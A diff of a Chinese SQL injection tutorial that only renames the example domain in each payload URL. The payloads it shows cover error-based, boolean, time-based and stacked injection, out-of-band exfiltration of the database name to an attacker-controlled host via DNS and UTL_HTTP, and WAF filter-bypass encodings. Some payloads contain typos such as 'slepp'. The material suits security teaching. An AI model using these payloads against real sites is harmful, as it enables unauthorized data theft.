@@ -148,7 +148,7 @@ POST型SQL注入漏洞（主要通过http请求工具，因为post请求不是�
 
 单引号判断法
 
-https://webtest.cjlio.com?id=1'
+https://webtest.xiaochenabc123.test.com?id=1'
 
 如果页面报错则存在SQL注入，因为sql会因为单引号个数不成对而导致sql执行错误而报错
 
@@ -168,7 +168,7 @@ SELECT * FROM test where id = '1' and '1'='1'
 
 针对于使用了LIKE关键字的
 
-https://webtest.cjlio.com?id=1$' and '1'='1' --
+https://webtest.xiaochenabc123.test.com?id=1$' and '1'='1' --
 
 简单的SQL注入防御方法：
 
@@ -185,7 +185,7 @@ SQL注入漏洞主要的类型：布尔型注入，可联合查询注入，基�
 
 布尔型注入
 
-https://webtest.cjlio.com/?id=1' and substring(version) = 5--
+https://webtest.xiaochenabc123.test.com/?id=1' and substring(version) = 5--
 
 布尔型注入被用于盲注，上面的例子中是通过布尔型注入来判断一下数据库版本是否为5，如果是的，那么将会是正常请求
 
@@ -195,7 +195,7 @@ https://webtest.cjlio.com/?id=1' and substring(version) = 5--
 
 基于时间延迟注入（通过判断请求响应的时间来得到想要的信息，盲注，当页面不会提供报错信息时，布尔型注入也无效时采用）
 
-https://webtest.cjlio.com/?id=1' and slepp(5)--
+https://webtest.xiaochenabc123.test.com/?id=1' and slepp(5)--
 
 slepp函数的作用是当sql语句执行完成后等待指定秒数再去返回执行结果，通过感觉时间来确定该语句是否正常执行
 
@@ -207,7 +207,7 @@ slepp函数的作用是当sql语句执行完成后等待指定秒数再去返回
 
 多语句查询型注入（当页面可以执行多条SQL语句时）
 
-例如：https://webtest.cjlio.com/?id=1; SELECT * FROM test where id =1--
+例如：https://webtest.xiaochenabc123.test.com/?id=1; SELECT * FROM test where id =1--
 
 多语句查询型注入可以使用时，很大可能UPDATA数据库更新或者删除数据库可以触发
 
@@ -240,9 +240,9 @@ OOB注入（out of band，带外通道技术）
 通过生成请求体来攻击，目标服务器接收到恶意的请求体后，进一步处理，处理的过程中目标服务器可能要向外部发送请求或者向外部获取资源，而这个外部实质是攻击者控制的服务器，在进行外部的请求时，将数据一起发送给攻击者控制的服务器，最后在攻击者控制的服务器查看数据（例如：通过dns记录来显示）
 
 
-https://test1.cjlio.com/?id=1' and SELECT CONCAT('\\\\',(SELECT database(),'.test2.cjlio.com');
+https://test1.xiaochenabc123.test.com/?id=1' and SELECT CONCAT('\\\\',(SELECT database(),'.test2.xiaochenabc123.test.com');
 
-https://test1.cjlio.com/?id=1' and  SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database(),'.test2.cjlio.com'));
+https://test1.xiaochenabc123.test.com/?id=1' and  SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database(),'.test2.xiaochenabc123.test.com'));
 
 最后在DNS记录中查看到想要的数据，上面的例子是获取当前的数据库名
 
@@ -250,9 +250,9 @@ https://test1.cjlio.com/?id=1' and  SELECT LOAD_FILE(CONCAT('\\\\',(SELECT datab
 利用HTTP协议来OOB注入
 
 
-https://test1.cjlio.com/?id=1' and  SELECT UTL_HTTP.REQUEST(https://test2.cjlio.com/test.php '||'?id='||(SELECT database())) FROM dual;
+https://test1.xiaochenabc123.test.com/?id=1' and  SELECT UTL_HTTP.REQUEST(https://test2.xiaochenabc123.test.com/test.php '||'?id='||(SELECT database())) FROM dual;
 
-上面的例子是通过https://test2.cjlio.com的test.php记录传递的数据，并且写入到test.txt中
+上面的例子是通过https://test2.xiaochenabc123.test.com的test.php记录传递的数据，并且写入到test.txt中
 
 
 混淆和绕过
@@ -265,15 +265,15 @@ https://test1.cjlio.com/?id=1' and  SELECT UTL_HTTP.REQUEST(https://test2.cjlio.
 OR可使用||绕过，AND可使用&&绕过
 
 
-union被过滤可使用||来绕过，例如：https://test1.cjlio.com/?id=1'  ||(SELECT user FROM usermain limit 1,1) = 'root'
+union被过滤可使用||来绕过，例如：https://test1.xiaochenabc123.test.com/?id=1'  ||(SELECT user FROM usermain limit 1,1) = 'root'
 
 
-limit被过滤，可通过GROUP BY语句创建一个虚拟表，来绕过，例如：https://test1.cjlio.com/?id=1'  ||  SELECT min(user),id FROM usermain GROUP BY user HAVING user='root'
+limit被过滤，可通过GROUP BY语句创建一个虚拟表，来绕过，例如：https://test1.xiaochenabc123.test.com/?id=1'  ||  SELECT min(user),id FROM usermain GROUP BY user HAVING user='root'
 
 
-GROUP BY被过滤，可通过SUBSTR()函数和GROUP_CONCAT()函数绕过，例如：https://test1.cjlio.com/?id=1'  ||  SELECT SUBSTR((SELECT GROUP_CONCAT(user)user FROM usermain),1,1)
+GROUP BY被过滤，可通过SUBSTR()函数和GROUP_CONCAT()函数绕过，例如：https://test1.xiaochenabc123.test.com/?id=1'  ||  SELECT SUBSTR((SELECT GROUP_CONCAT(user)user FROM usermain),1,1)
 
- SELECT和引号被过滤，可通过SUBSTR()函数绕过，例如：https://test1.cjlio.com/?id=1'  || SUBSTR(user,1,1=0x72)
+ SELECT和引号被过滤，可通过SUBSTR()函数绕过，例如：https://test1.xiaochenabc123.test.com/?id=1'  || SUBSTR(user,1,1=0x72)
 
 空格被过滤，可通过/**/来替代空格来分开sql语句
 
@@ -284,7 +284,7 @@ GROUP BY被过滤，可通过SUBSTR()函数和GROUP_CONCAT()函数绕过，例�
 
 双重编码绕过：当某个url编码的参数会被WAF编码过滤时，可对参数进行二次编码，让WAF解第一层编码，但是还有第二层编码，从而达到绕过的目的
 
-编码注入（url编码）：%27表示'，%23表示#，%df表示无意义，%5c表示\，%3d表示=，%2A表示*，例如：https://test1.cjlio.com/?id=1 %df SELECT %2A FROM test where id %3d 1 %23
+编码注入（url编码）：%27表示'，%23表示#，%df表示无意义，%5c表示\，%3d表示=，%2A表示*，例如：https://test1.xiaochenabc123.test.com/?id=1 %df SELECT %2A FROM test where id %3d 1 %23
 
 
 二次注入：数据库存储的数据并不安全，不应该直接调用数据库的数据，例如admin'#
